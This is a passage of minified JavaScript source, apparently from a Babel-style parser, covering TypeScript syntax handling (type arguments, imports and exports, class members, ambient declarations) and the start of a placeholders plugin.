0:Y.type)==="TSTypeCastExpression")this.raise(E1.UnexpectedTypeAnnotation,Y.typeAnnotation)})}toReferencedList(Q,Y){return this.tsCheckForInvalidTypeCasts(Q),Q}parseArrayLike(Q,Y,W,z){let G=super.parseArrayLike(Q,Y,W,z);if(G.type==="ArrayExpression")this.tsCheckForInvalidTypeCasts(G.elements);return G}parseSubscript(Q,Y,W,z){if(!this.hasPrecedingLineBreak()&&this.match(35)){this.state.canStartJSXElement=!1,this.next();let H=this.startNodeAt(Y);return H.expression=Q,this.finishNode(H,"TSNonNullExpression")}let G=!1;if(this.match(18)&&this.lookaheadCharCode()===60){if(W)return z.stop=!0,Q;z.optionalChainMember=G=!0,this.next()}if(this.match(47)||this.match(51)){let H,U=this.tsTryParseAndCatch(()=>{if(!W&&this.atPossibleAsyncArrow(Q)){let Z=this.tsTryParseGenericAsyncArrowFunction(Y);if(Z)return z.stop=!0,Z}let K=this.tsParseTypeArgumentsInExpression();if(!K)return;if(G&&!this.match(10)){H=this.state.curPosition();return}if(G4(this.state.type)){let Z=super.parseTaggedTemplateExpression(Q,Y,z);return Z.typeParameters=K,Z}if(!W&&this.eat(10)){let Z=this.startNodeAt(Y);if(Z.callee=Q,Z.arguments=this.parseCallExpressionArguments(),this.tsCheckForInvalidTypeCasts(Z.arguments),Z.typeParameters=K,z.optionalChainMember)Z.optional=G;return this.finishCallExpression(Z,z.optionalChainMember)}let V=this.state.type;if(V===48||V===52||V!==10&&M5(V)&&!this.hasPrecedingLineBreak())return;let B=this.startNodeAt(Y);return B.expression=Q,B.typeParameters=K,this.finishNode(B,"TSInstantiationExpression")});if(H)this.unexpected(H,10);if(U){if(U.type==="TSInstantiationExpression"){if(this.match(16)||this.match(18)&&this.lookaheadCharCode()!==40)this.raise(E1.InvalidPropertyAccessAfterInstantiationExpression,this.state.startLoc);if(!this.match(16)&&!this.match(18))U.expression=super.stopParseSubscript(Q,z)}return U}}return super.parseSubscript(Q,Y,W,z)}parseNewCallee(Q){var Y;super.parseNewCallee(Q);let{callee:W}=Q;if(W.type==="TSInstantiationExpression"&&!((Y=W.extra)!=null&&Y.parenthesized))Q.typeParameters=W.typeParameters,Q.callee=W.expression}parseExprOp(Q,Y,W){let z;if(Y4(58)>W&&!this.hasPrecedingLineBreak()&&(this.isContextual(93)||(z=this.isContextual(120)))){let G=this.startNodeAt(Y);return G.expression=Q,G.typeAnnotation=this.tsInType(()=>{if(this.next(),this.match(75)){if(z)this.raise(b.UnexpectedKeyword,this.state.startLoc,{keyword:"const"});return this.tsParseTypeReference()}return this.tsParseType()}),this.finishNode(G,z?"TSSatisfiesExpression":"TSAsExpression"),this.reScan_lt_gt(),this.parseExprOp(G,Y,W)}return super.parseExprOp(Q,Y,W)}checkReservedWord(Q,Y,W,z){if(!this.state.isAmbientContext)super.checkReservedWord(Q,Y,W,z)}checkImportReflection(Q){if(super.checkImportReflection(Q),Q.module&&Q.importKind!=="value")this.raise(E1.ImportReflectionHasImportType,Q.specifiers[0].loc.start)}checkDuplicateExports(){}isPotentialImportPhase(Q){if(super.isPotentialImportPhase(Q))return!0;if(this.isContextual(130)){let Y=this.lookaheadCharCode();return Q?Y===123||Y===42:Y!==61}return!Q&&this.isContextual(87)}applyImportPhase(Q,Y,W,z){if(super.applyImportPhase(Q,Y,W,z),Y)Q.exportKind=W==="type"?"type":"value";else Q.importKind=W==="type"||W==="typeof"?W:"value"}parseImport(Q){if(this.match(134))return Q.importKind="value",super.parseImport(Q);let Y;if(C0(this.state.type)&&this.lookaheadCharCode()===61)return Q.importKind="value",this.tsParseImportEqualsDeclaration(Q);else if(this.isContextual(130)){let W=this.parseMaybeImportPhase(Q,!1);if(this.lookaheadCharCode()===61)return this.tsParseImportEqualsDeclaration(Q,W);else Y=super.parseImportSpecifiersAndAfter(Q,W)}else Y=super.parseImport(Q);if(Y.importKind==="type"&&Y.specifiers.length>1&&Y.specifiers[0].type==="ImportDefaultSpecifier")this.raise(E1.TypeImportCannotSpecifyDefaultAndNamed,Y);return Y}parseExport(Q,Y){if(this.match(83)){let W=Q;this.next();let z=null;if(this.isContextual(130)&&this.isPotentialImportPhase(!1))z=this.parseMaybeImportPhase(W,!1);else W.importKind="value";return this.tsParseImportEqualsDeclaration(W,z,!0)}else if(this.eat(29)){let W=Q;return W.expression=super.parseExpression(),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(W,"TSExportAssignment")}else if(this.eatContextual(93)){let W=Q;return this.expectContextual(128),W.id=this.parseIdentifier(),this.semicolon(),this.finishNode(W,"TSNamespaceExportDeclaration")}else return super.parseExport(Q,Y)}isAbstractClass(){return this.isContextual(124)&&this.isLookaheadContextual("class")}parseExportDefaultExpression(){if(this.isAbstractClass()){let Q=this.startNode();return this.next(),Q.abstract=!0,this.parseClass(Q,!0,!0)}if(this.match(129)){let Q=this.tsParseInterfaceDeclaration(this.startNode());if(Q)return Q}return super.parseExportDefaultExpression()}parseVarStatement(Q,Y,W=!1){let{isAmbientContext:z}=this.state,G=super.parseVarStatement(Q,Y,W||z);if(!z)return G;if(!Q.declare&&(Y==="using"||Y==="await using"))return this.raiseOverwrite(E1.UsingDeclarationInAmbientContext,Q,Y),G;for(let{id:H,init:U}of G.declarations){if(!U)continue;if(Y==="var"||Y==="let"||!!H.typeAnnotation)this.raise(E1.InitializerNotAllowedInAmbientContext,U);else if(!E_(U,this.hasPlugin("estree")))this.raise(E1.ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference,U)}return G}parseStatementContent(Q,Y){if(this.match(75)&&this.isLookaheadContextual("enum")){let W=this.startNode();return this.expect(75),this.tsParseEnumDeclaration(W,{const:!0})}if(this.isContextual(126))return this.tsParseEnumDeclaration(this.startNode());if(this.isContextual(129)){let W=this.tsParseInterfaceDeclaration(this.startNode());if(W)return W}return super.parseStatementContent(Q,Y)}parseAccessModifier(){return this.tsParseModifier(["public","protected","private"])}tsHasSomeModifiers(Q,Y){return Y.some((W)=>{if(hK(W))return Q.accessibility===W;return!!Q[W]})}tsIsStartOfStaticBlocks(){return this.isContextual(106)&&this.lookaheadCharCode()===123}parseClassMember(Q,Y,W){let z=["declare","private","public","protected","override","abstract","readonly","static"];this.tsParseModifiers({allowedModifiers:z,disallowedModifiers:["in","out"],stopOnStartOfClassStaticBlock:!0,errorTemplate:E1.InvalidModifierOnTypeParameterPositions},Y);let G=()=>{if(this.tsIsStartOfStaticBlocks()){if(this.next(),this.next(),this.tsHasSomeModifiers(Y,z))this.raise(E1.StaticBlockCannotHaveModifier,this.state.curPosition());super.parseClassStaticBlock(Q,Y)}else this.parseClassMemberWithIsStatic(Q,Y,W,!!Y.static)};if(Y.declare)this.tsInAmbientContext(G);else G()}parseClassMemberWithIsStatic(Q,Y,W,z){let G=this.tsTryParseIndexSignature(Y);if(G){if(Q.body.push(G),Y.abstract)this.raise(E1.IndexSignatureHasAbstract,Y);if(Y.accessibility)this.raise(E1.IndexSignatureHasAccessibility,Y,{modifier:Y.accessibility});if(Y.declare)this.raise(E1.IndexSignatureHasDeclare,Y);if(Y.override)this.raise(E1.IndexSignatureHasOverride,Y);return}if(!this.state.inAbstractClass&&Y.abstract)this.raise(E1.NonAbstractClassHasAbstractMethod,Y);if(Y.override){if(!W.hadSuperClass)this.raise(E1.OverrideNotInSubClass,Y)}super.parseClassMemberWithIsStatic(Q,Y,W,z)}parsePostMemberNameModifiers(Q){if(this.eat(17))Q.optional=!0;if(Q.readonly&&this.match(10))this.raise(E1.ClassMethodHasReadonly,Q);if(Q.declare&&this.match(10))this.raise(E1.ClassMethodHasDeclare,Q)}parseExpressionStatement(Q,Y,W){return(Y.type==="Identifier"?this.tsParseExpressionStatement(Q,Y,W):void 0)||super.parseExpressionStatement(Q,Y,W)}shouldParseExportDeclaration(){if(this.tsIsDeclarationStart())return!0;return super.shouldParseExportDeclaration()}parseConditional(Q,Y,W){if(!this.match(17))return Q;if(this.state.maybeInArrowParameters){let z=this.lookaheadCharCode();if(z===44||z===61||z===58||z===41)return this.setOptionalParametersError(W),Q}return super.parseConditional(Q,Y,W)}parseParenItem(Q,Y){let W=super.parseParenItem(Q,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(Q);if(this.match(14)){let z=this.startNodeAt(Y);return z.expression=Q,z.typeAnnotation=this.tsParseTypeAnnotation(),this.finishNode(z,"TSTypeCastExpression")}return Q}parseExportDeclaration(Q){if(!this.state.isAmbientContext&&this.isContextual(125))return this.tsInAmbientContext(()=>this.parseExportDeclaration(Q));let Y=this.state.startLoc,W=this.eatContextual(125);if(W&&(this.isContextual(125)||!this.shouldParseExportDeclaration()))throw this.raise(E1.ExpectedAmbientAfterExportDeclare,this.state.startLoc);let G=C0(this.state.type)&&this.tsTryParseExportDeclaration()||super.parseExportDeclaration(Q);if(!G)return null;if(G.type==="TSInterfaceDeclaration"||G.type==="TSTypeAliasDeclaration"||W)Q.exportKind="type";if(W&&G.type!=="TSImportEqualsDeclaration")this.resetStartLocation(G,Y),G.declare=!0;return G}parseClassId(Q,Y,W,z){if((!Y||W)&&this.isContextual(113))return;super.parseClassId(Q,Y,W,Q.declare?1024:8331);let G=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers);if(G)Q.typeParameters=G}parseClassPropertyAnnotation(Q){if(!Q.optional){if(this.eat(35))Q.definite=!0;else if(this.eat(17))Q.optional=!0}let Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y}parseClassProperty(Q){if(this.parseClassPropertyAnnotation(Q),this.state.isAmbientContext&&!(Q.readonly&&!Q.typeAnnotation)&&this.match(29))this.raise(E1.DeclareClassFieldHasInitializer,this.state.startLoc);if(Q.abstract&&this.match(29)){let{key:Y}=Q;this.raise(E1.AbstractPropertyHasInitializer,this.state.startLoc,{propertyName:Y.type==="Identifier"&&!Q.computed?Y.name:`[${this.input.slice(this.offsetToSourcePos(Y.start),this.offsetToSourcePos(Y.end))}]`})}return super.parseClassProperty(Q)}parseClassPrivateProperty(Q){if(Q.abstract)this.raise(E1.PrivateElementHasAbstract,Q);if(Q.accessibility)this.raise(E1.PrivateElementHasAccessibility,Q,{modifier:Q.accessibility});return this.parseClassPropertyAnnotation(Q),super.parseClassPrivateProperty(Q)}parseClassAccessorProperty(Q){if(this.parseClassPropertyAnnotation(Q),Q.optional)this.raise(E1.AccessorCannotBeOptional,Q);return super.parseClassAccessorProperty(Q)}pushClassMethod(Q,Y,W,z,G,H){let U=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(U&&G)this.raise(E1.ConstructorHasTypeParameters,U);let{declare:K=!1,kind:V}=Y;if(K&&(V==="get"||V==="set"))this.raise(E1.DeclareAccessor,Y,{kind:V});if(U)Y.typeParameters=U;super.pushClassMethod(Q,Y,W,z,G,H)}pushClassPrivateMethod(Q,Y,W,z){let G=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(G)Y.typeParameters=G;super.pushClassPrivateMethod(Q,Y,W,z)}declareClassPrivateMethodInScope(Q,Y){if(Q.type==="TSDeclareMethod")return;if(Q.type==="MethodDefinition"&&Q.value.body==null)return;super.declareClassPrivateMethodInScope(Q,Y)}parseClassSuper(Q){if(super.parseClassSuper(Q),Q.superClass&&(this.match(47)||this.match(51)))Q.superTypeParameters=this.tsParseTypeArgumentsInExpression();if(this.eatContextual(113))Q.implements=this.tsParseHeritageClause("implements")}parseObjPropValue(Q,Y,W,z,G,H,U){let K=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(K)Q.typeParameters=K;return super.parseObjPropValue(Q,Y,W,z,G,H,U)}parseFunctionParams(Q,Y){let W=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(W)Q.typeParameters=W;super.parseFunctionParams(Q,Y)}parseVarId(Q,Y){if(super.parseVarId(Q,Y),Q.id.type==="Identifier"&&!this.hasPrecedingLineBreak()&&this.eat(35))Q.definite=!0;let W=this.tsTryParseTypeAnnotation();if(W)Q.id.typeAnnotation=W,this.resetEndLocation(Q.id)}parseAsyncArrowFromCallExpression(Q,Y){if(this.match(14))Q.returnType=this.tsParseTypeAnnotation();return super.parseAsyncArrowFromCallExpression(Q,Y)}parseMaybeAssign(Q,Y){var W,z,G,H,U;let K,V,B;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(K=this.state.clone(),V=this.tryParse(()=>super.parseMaybeAssign(Q,Y),K),!V.error)return V.node;let{context:F}=this.state,j=F[F.length-1];if(j===w0.j_oTag||j===w0.j_expr)F.pop()}if(!((W=V)!=null&&W.error)&&!this.match(47))return super.parseMaybeAssign(Q,Y);if(!K||K===this.state)K=this.state.clone();let Z,M=this.tryParse((F)=>{var j,O;Z=this.tsParseTypeParameters(this.tsParseConstModifier);let N=super.parseMaybeAssign(Q,Y);if(N.type!=="ArrowFunctionExpression"||(j=N.extra)!=null&&j.parenthesized)F();if(((O=Z)==null?void 0:O.params.length)!==0)this.resetStartLocationFromNode(N,Z);return N.typeParameters=Z,N},K);if(!M.error&&!M.aborted){if(Z)this.reportReservedArrowTypeParam(Z);return M.node}if(!V){if(gK(!this.hasPlugin("jsx")),B=this.tryParse(()=>super.parseMaybeAssign(Q,Y),K),!B.error)return B.node}if((z=V)!=null&&z.node)return this.state=V.failState,V.node;if(M.node){if(this.state=M.failState,Z)this.reportReservedArrowTypeParam(Z);return M.node}if((G=B)!=null&&G.node)return this.state=B.failState,B.node;throw((H=V)==null?void 0:H.error)||M.error||((U=B)==null?void 0:U.error)}reportReservedArrowTypeParam(Q){var Y;if(Q.params.length===1&&!Q.params[0].constraint&&!((Y=Q.extra)!=null&&Y.trailingComma)&&this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(E1.ReservedArrowTypeParam,Q)}parseMaybeUnary(Q,Y){if(!this.hasPlugin("jsx")&&this.match(47))return this.tsParseTypeAssertion();return super.parseMaybeUnary(Q,Y)}parseArrow(Q){if(this.match(14)){let Y=this.tryParse((W)=>{let z=this.tsParseTypeOrTypePredicateAnnotation(14);if(this.canInsertSemicolon()||!this.match(19))W();return z});if(Y.aborted)return;if(!Y.thrown){if(Y.error)this.state=Y.failState;Q.returnType=Y.node}}return super.parseArrow(Q)}parseFunctionParamType(Q){if(this.eat(17))Q.optional=!0;let Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y;return this.resetEndLocation(Q),Q}isAssignable(Q,Y){switch(Q.type){case"TSTypeCastExpression":return this.isAssignable(Q.expression,Y);case"TSParameterProperty":return!0;default:return super.isAssignable(Q,Y)}}toAssignable(Q,Y=!1){switch(Q.type){case"ParenthesizedExpression":this.toAssignableParenthesizedExpression(Q,Y);break;case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":if(Y)this.expressionScope.recordArrowParameterBindingError(E1.UnexpectedTypeCastInParameter,Q);else this.raise(E1.UnexpectedTypeCastInParameter,Q);this.toAssignable(Q.expression,Y);break;case"AssignmentExpression":if(!Y&&Q.left.type==="TSTypeCastExpression")Q.left=this.typeCastToParameter(Q.left);default:super.toAssignable(Q,Y)}}toAssignableParenthesizedExpression(Q,Y){switch(Q.expression.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":case"ParenthesizedExpression":this.toAssignable(Q.expression,Y);break;default:super.toAssignable(Q,Y)}}checkToRestConversion(Q,Y){switch(Q.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":this.checkToRestConversion(Q.expression,!1);break;default:super.checkToRestConversion(Q,Y)}}isValidLVal(Q,Y,W){switch(Q){case"TSTypeCastExpression":return!0;case"TSParameterProperty":return"parameter";case"TSNonNullExpression":return"expression";case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":return(W!==64||!Y)&&["expression",!0];default:return super.isValidLVal(Q,Y,W)}}parseBindingAtom(){if(this.state.type===78)return this.parseIdentifier(!0);return super.parseBindingAtom()}parseMaybeDecoratorArguments(Q,Y){if(this.match(47)||this.match(51)){let W=this.tsParseTypeArgumentsInExpression();if(this.match(10)){let z=super.parseMaybeDecoratorArguments(Q,Y);return z.typeParameters=W,z}this.unexpected(null,10)}return super.parseMaybeDecoratorArguments(Q,Y)}checkCommaAfterRest(Q){if(this.state.isAmbientContext&&this.match(12)&&this.lookaheadCharCode()===Q)return this.next(),!1;return super.checkCommaAfterRest(Q)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(35)||this.match(14)||super.isClassProperty()}parseMaybeDefault(Q,Y){let W=super.parseMaybeDefault(Q,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(E1.TypeAnnotationAfterAssign,W.typeAnnotation);return W}getTokenFromCode(Q){if(this.state.inType){if(Q===62){this.finishOp(48,1);return}if(Q===60){this.finishOp(47,1);return}}super.getTokenFromCode(Q)}reScan_lt_gt(){let{type:Q}=this.state;if(Q===47)this.state.pos-=1,this.readToken_lt();else if(Q===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:Q}=this.state;if(Q===51)return this.state.pos-=2,this.finishOp(47,1),47;return Q}toAssignableListItem(Q,Y,W){let z=Q[Y];if(z.type==="TSTypeCastExpression")Q[Y]=this.typeCastToParameter(z);super.toAssignableListItem(Q,Y,W)}typeCastToParameter(Q){return Q.expression.typeAnnotation=Q.typeAnnotation,this.resetEndLocation(Q.expression,Q.typeAnnotation.loc.end),Q.expression}shouldParseArrow(Q){if(this.match(14))return Q.every((Y)=>this.isAssignable(Y,!0));return super.shouldParseArrow(Q)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}canHaveLeadingDecorator(){return super.canHaveLeadingDecorator()||this.isAbstractClass()}jsxParseOpeningElementAfterName(Q){if(this.match(47)||this.match(51)){let Y=this.tsTryParseAndCatch(()=>this.tsParseTypeArgumentsInExpression());if(Y)Q.typeParameters=Y}return super.jsxParseOpeningElementAfterName(Q)}getGetterSetterExpectedParamCount(Q){let Y=super.getGetterSetterExpectedParamCount(Q),z=this.getObjectOrClassMethodParams(Q)[0];return z&&this.isThisParam(z)?Y+1:Y}parseCatchClauseParam(){let Q=super.parseCatchClauseParam(),Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y,this.resetEndLocation(Q);return Q}tsInAmbientContext(Q){let{isAmbientContext:Y,strict:W}=this.state;this.state.isAmbientContext=!0,this.state.strict=!1;try{return Q()}finally{this.state.isAmbientContext=Y,this.state.strict=W}}parseClass(Q,Y,W){let z=this.state.inAbstractClass;this.state.inAbstractClass=!!Q.abstract;try{return super.parseClass(Q,Y,W)}finally{this.state.inAbstractClass=z}}tsParseAbstractDeclaration(Q,Y){if(this.match(80))return Q.abstract=!0,this.maybeTakeDecorators(Y,this.parseClass(Q,!0,!1));else if(this.isContextual(129)){if(!this.hasFollowingLineBreak())return Q.abstract=!0,this.raise(E1.NonClassMethodPropertyHasAbstractModifier,Q),this.tsParseInterfaceDeclaration(Q)}else this.unexpected(null,80)}parseMethod(Q,Y,W,z,G,H,U){let K=super.parseMethod(Q,Y,W,z,G,H,U);if(K.abstract||K.type==="TSAbstractMethodDefinition"){if((this.hasPlugin("estree")?K.value:K).body){let{key:Z}=K;this.raise(E1.AbstractMethodHasImplementation,K,{methodName:Z.type==="Identifier"&&!K.computed?Z.name:`[${this.input.slice(this.offsetToSourcePos(Z.start),this.offsetToSourcePos(Z.end))}]`})}}return K}tsParseTypeParameterName(){return this.parseIdentifier().name}shouldParseAsAmbientContext(){return!!this.getPluginOption("typescript","dts")}parse(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.parse()}getExpression(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.getExpression()}parseExportSpecifier(Q,Y,W,z){if(!Y&&z)return this.parseTypeOnlyImportExportSpecifier(Q,!1,W),this.finishNode(Q,"ExportSpecifier");return Q.exportKind="value",super.parseExportSpecifier(Q,Y,W,z)}parseImportSpecifier(Q,Y,W,z,G){if(!Y&&z)return this.parseTypeOnlyImportExportSpecifier(Q,!0,W),this.finishNode(Q,"ImportSpecifier");return Q.importKind="value",super.parseImportSpecifier(Q,Y,W,z,W?4098:4096)}parseTypeOnlyImportExportSpecifier(Q,Y,W){let z=Y?"imported":"local",G=Y?"local":"exported",H=Q[z],U,K=!1,V=!0,B=H.loc.start;if(this.isContextual(93)){let M=this.parseIdentifier();if(this.isContextual(93)){let F=this.parseIdentifier();if(I8(this.state.type))K=!0,H=M,U=Y?this.parseIdentifier():this.parseModuleExportName(),V=!1;else U=F,V=!1}else if(I8(this.state.type))V=!1,U=Y?this.parseIdentifier():this.parseModuleExportName();else K=!0,H=M}else if(I8(this.state.type))if(K=!0,Y){if(H=this.parseIdentifier(!0),!this.isContextual(93))this.checkReservedWord(H.name,H.loc.start,!0,!0)}else H=this.parseModuleExportName();if(K&&W)this.raise(Y?E1.TypeModifierIsUsedInTypeImports:E1.TypeModifierIsUsedInTypeExports,B);Q[z]=H,Q[G]=U;let Z=Y?"importKind":"exportKind";if(Q[Z]=K?"type":"value",V&&this.eatContextual(93))Q[G]=Y?this.parseIdentifier():this.parseModuleExportName();if(!Q[G])Q[G]=this.cloneIdentifier(Q[z]);if(Y)this.checkIdentifier(Q[G],K?4098:4096)}fillOptionalPropertiesForTSESLint(Q){var Y,W,z,G,H,U,K,V,B,Z,M,F,j,O,N,A,D,S,$,T,k,E,y,a,p,f,m,o,J1,H1,d,Q1,u,z1,B1,N1,i1,d1,X0,b1,S1,g,X1,V1,n,r,G1,$1;switch(Q.type){case"ExpressionStatement":(Y=Q.directive)!=null||(Q.directive=void 0);return;case"RestElement":Q.value=void 0;case"Identifier":case"ArrayPattern":case"AssignmentPattern":case"ObjectPattern":(W=Q.decorators)!=null||(Q.decorators=[]),(z=Q.optional)!=null||(Q.optional=!1),(G=Q.typeAnnotation)!=null||(Q.typeAnnotation=void 0);return;case"TSParameterProperty":(H=Q.accessibility)!=null||(Q.accessibility=void 0),(U=Q.decorators)!=null||(Q.decorators=[]),(K=Q.override)!=null||(Q.override=!1),(V=Q.readonly)!=null||(Q.readonly=!1),(B=Q.static)!=null||(Q.static=!1);return;case"TSEmptyBodyFunctionExpression":Q.body=null;case"TSDeclareFunction":case"FunctionDeclaration":case"FunctionExpression":case"ClassMethod":case"ClassPrivateMethod":(Z=Q.declare)!=null||(Q.declare=!1),(M=Q.returnType)!=null||(Q.returnType=void 0),(F=Q.typeParameters)!=null||(Q.typeParameters=void 0);return;case"Property":(j=Q.optional)!=null||(Q.optional=!1);return;case"TSMethodSignature":case"TSPropertySignature":(O=Q.optional)!=null||(Q.optional=!1);case"TSIndexSignature":(N=Q.accessibility)!=null||(Q.accessibility=void 0),(A=Q.readonly)!=null||(Q.readonly=!1),(D=Q.static)!=null||(Q.static=!1);return;case"TSAbstractPropertyDefinition":case"PropertyDefinition":case"TSAbstractAccessorProperty":case"AccessorProperty":(S=Q.declare)!=null||(Q.declare=!1),($=Q.definite)!=null||(Q.definite=!1),(T=Q.readonly)!=null||(Q.readonly=!1),(k=Q.typeAnnotation)!=null||(Q.typeAnnotation=void 0);case"TSAbstractMethodDefinition":case"MethodDefinition":(E=Q.accessibility)!=null||(Q.accessibility=void 0),(y=Q.decorators)!=null||(Q.decorators=[]),(a=Q.override)!=null||(Q.override=!1),(p=Q.optional)!=null||(Q.optional=!1);return;case"ClassExpression":(f=Q.id)!=null||(Q.id=null);case"ClassDeclaration":(m=Q.abstract)!=null||(Q.abstract=!1),(o=Q.declare)!=null||(Q.declare=!1),(J1=Q.decorators)!=null||(Q.decorators=[]),(H1=Q.implements)!=null||(Q.implements=[]),(d=Q.superTypeArguments)!=null||(Q.superTypeArguments=void 0),(Q1=Q.typeParameters)!=null||(Q.typeParameters=void 0);return;case"TSTypeAliasDeclaration":case"VariableDeclaration":(u=Q.declare)!=null||(Q.declare=!1);return;case"VariableDeclarator":(z1=Q.definite)!=null||(Q.definite=!1);return;case"TSEnumDeclaration":(B1=Q.const)!=null||(Q.const=!1),(N1=Q.declare)!=null||(Q.declare=!1);return;case"TSEnumMember":(i1=Q.computed)!=null||(Q.computed=!1);return;case"TSImportType":(d1=Q.qualifier)!=null||(Q.qualifier=null),(X0=Q.options)!=null||(Q.options=null);return;case"TSInterfaceDeclaration":(b1=Q.declare)!=null||(Q.declare=!1),(S1=Q.extends)!=null||(Q.extends=[]);return;case"TSMappedType":(g=Q.optional)!=null||(Q.optional=!1),(X1=Q.readonly)!=null||(Q.readonly=void 0);return;case"TSModuleDeclaration":(V1=Q.declare)!=null||(Q.declare=!1),(n=Q.global)!=null||(Q.global=Q.kind==="global");return;case"TSTypeParameter":(r=Q.const)!=null||(Q.const=!1),(G1=Q.in)!=null||(Q.in=!1),($1=Q.out)!=null||(Q.out=!1);return}}};function __(X){if(X.type!=="MemberExpression")return!1;let{computed:J,property:Q}=X;if(J&&Q.type!=="StringLiteral"&&(Q.type!=="TemplateLiteral"||Q.expressions.length>0))return!1;return jV(X.object)}function E_(X,J){var Q;let{type:Y}=X;if((Q=X.extra)!=null&&Q.parenthesized)return!1;if(J){if(Y==="Literal"){let{value:W}=X;if(typeof W==="string"||typeof W==="boolean")return!0}}else if(Y==="StringLiteral"||Y==="BooleanLiteral")return!0;if(FV(X,J)||$_(X,J))return!0;if(Y==="TemplateLiteral"&&X.expressions.length===0)return!0;if(__(X))return!0;return!1}function FV(X,J){if(J)return X.type==="Literal"&&(typeof X.value==="number"||("bigint"in X));return X.type==="NumericLiteral"||X.type==="BigIntLiteral"}function $_(X,J){if(X.type==="UnaryExpression"){let{operator:Q,argument:Y}=X;if(Q==="-"&&FV(Y,J))return!0}return!1}function jV(X){if(X.type==="Identifier")return!0;if(X.type!=="MemberExpression"||X.computed)return!1;return jV(X.object)}var yK=r8`placeholders`({ClassNameIsRequired:"A class name is required.",UnexpectedSpace:"Unexpected space in placeholder."}),k_=(X)=>class J extends X{parsePlaceholder(Q){if(this.match(133)){let Y=this.startNode();return this.next(),this.assertNoSpace(),Y.name=super.parseIdentifier(!0),this.assertNoSpace(),this.expect(133),this.finishPlaceholder(Y,Q)}}finishPlaceholder(Q,Y){let W=Q;if(!W.expectedNode||!W.type)W=this.finishNode(W,"Placeholder");return W.expectedNode=Y,W}getTokenFromCode(Q){if(Q===37&&this.input.charCodeAt(this.state.pos+1)===37)this.finishOp(133,2);else super.getTokenFromCode(Q)}parseExprAtom(Q){return this.parsePlaceholder("Expression")||super.parseExprAtom(Q)}parseIdentifier(Q){return this.parsePlaceholder("Identifier")||super.parseIdentifier(Q)}checkReservedWord(Q,Y,W,z){if(Q!==void 0)super.checkReservedWord(Q,Y,W,z)}cloneIdentifier(Q){let Y=super.cloneIdentifier(Q);if(Y.type==="Placeholder")Y.expectedNode=Q.expectedNode;return Y}cloneStringLiteral(Q){if(Q.type==="Placeholder")return this.cloneIdentifier(Q);return super.cloneStringLiteral(Q)}parseBindingAtom(){return this.parsePlaceholder("Pattern")||super.parseBindingAtom()}isValidLVal(Q,Y,W){return Q==="Placeholder"||super.isValidLVal(Q,Y,W)}toAssignable(Q,Y){if(Q&&Q.type==="Placeholder"&&Q.expectedNode==="Expression")Q.expectedNode="Pattern";else super.toAssignable(Q,Y)}chStartsBindingIdentifier(Q,Y){if(super.chStartsBindingIdentifier(Q,Y))return!0;let W=this.nextTokenStart();if(this.input.charCodeAt(W)===37&&this.input.charCodeAt(W+1)===37)return!0;return!1}verifyBreakContinue(Q,Y){if(Q.label&&Q.label.type==="Placeholder")return;super.verifyBreakContinue(Q,Y)}parseExpressionStatement(Q,Y){var W;if(Y.type!=="Placeholder"||(W=Y.extra)!=null&&W.parenthesized)return super.parseExpressionStatement(Q,Y);if(this.match(14)){let G=Q;return G.label=this.finishPlaceholder(Y,"Identifier"),this.next(),G.body=super.parseStatementOrSloppyAnnexBFunctionDeclaration(),this.finishNode(G,"LabeledStatement")}this.semicolon();let z=Q;return z.name=Y.name,this.finishPlaceholder(z,"Statement")}parseBlock(Q,Y,W){return this.parsePlaceholder("BlockStatement")||super.parseBlock(Q,Y,W)}parseFunctionId(Q){return this.parsePlaceholder("Identifier")||super.parseFunctionId(Q)}parseClass(Q,Y,W){let z=Y?"ClassDeclaration":"ClassExpression";this.next();let G=this.state.strict,H=this.parsePlaceholder("Identifier");if(H)if(this.match(81)||this.match(133)||this.match(5))Q.id=H;else if(W||!Y)return Q.id=null,Q.body=this.finishPlaceholder(H,"ClassBody"),this.finishNode(Q,z);else throw this.raise(yK.ClassNameIsRequired,this.state.startLoc);else this.parseClassId(Q,Y,W);return super.parseClassSuper(Q),Q.body=this.parsePlaceholder("ClassBody")||super.parseClassBody(!!Q.superClass,G),this.finishNode(Q,z)}parseExport(Q,Y){let W=this.parsePlaceholder("Identifier");if(!W)return super.parseExport(Q,Y);let z=Q;if(!this.isContextual(98)&&!this.match(12))return z.specifiers=[],z.source=null,z.declaration=this.finishPlaceholder(W,"Declaration"),this.finishNode(z,"ExportNamedDeclaration");this.expectPlugin("exportDefaultFrom");let G=this.startNode();return G.exported=W,z.specifiers=[this.finishNode(G,"ExportDefaultSpecifier")],super.parseExport(z,Y)}isExportDefaultSpecifier(){if(this.match(65)){let Q=this.nextTokenStart();if(this.isUnparsedContextual(Q,"from")){if(this.input.startsWith(r6(133),this.nextTokenStartSince(Q+4)))return!0}}return super.isExportDefaultSpecifier()}maybeParseExportDefaultSpecifier(Q,Y){var W;if((W=Q.specifiers)!=null&&W.length)return!0;return 